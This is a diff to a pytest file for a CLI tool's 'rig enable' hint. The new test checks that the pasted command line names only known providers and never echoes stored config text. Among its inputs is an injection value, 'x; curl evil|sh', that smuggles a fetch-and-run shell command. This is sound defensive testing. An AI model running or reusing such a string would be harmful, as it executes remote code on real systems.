@@ -23,10 +23,10 @@ def label_of(mid):
     return f"flotilla:0123456789ab:{mid}"
 
 
-def state_on(tmp_path, word="on"):
+def state_on(tmp_path, word="on", provider="vast"):
     state = tmp_path / "state"
     state.mkdir(exist_ok=True)
-    (state / "machine.toml").write_text(render_toml({"rig": word, "rig_provider": "vast"}))
+    (state / "machine.toml").write_text(render_toml({"rig": word, "rig_provider": provider}))
     return state
 
 
@@ -70,6 +70,20 @@ def test_with_rig_off_a_request_says_enable_first(tmp_path):
     rig(state).ask("main session 3", "frames", project="/work/alpha")
     [text] = texts(state, T0)
     assert "rig enable" in text
+
+
+@pytest.mark.parametrize("provider,said", [
+    ("vast", "`! flotilla rig enable --provider vast` first"),
+    ("digitalocean", "`! flotilla rig enable --provider digitalocean` first"),
+    ("", "`! flotilla rig enable --provider NAME` (NAME: vast or digitalocean) first"),
+    ("x; curl evil|sh", "`! flotilla rig enable --provider NAME` (NAME: vast or digitalocean) first"),
+])
+def test_the_enable_line_names_the_service_this_machine_used_or_the_ones_to_choose_from(tmp_path, provider, said):
+    """The person pastes the line: it carries a known service's name or none, never text from machine.toml."""
+    state = state_on(tmp_path, "off", provider)
+    rig(state).ask("main session 3", "frames", project="/work/alpha")
+    [text] = texts(state, T0)
+    assert said in text and "curl" not in text
 
 
 def test_an_image_request_names_the_allow_line(tmp_path):
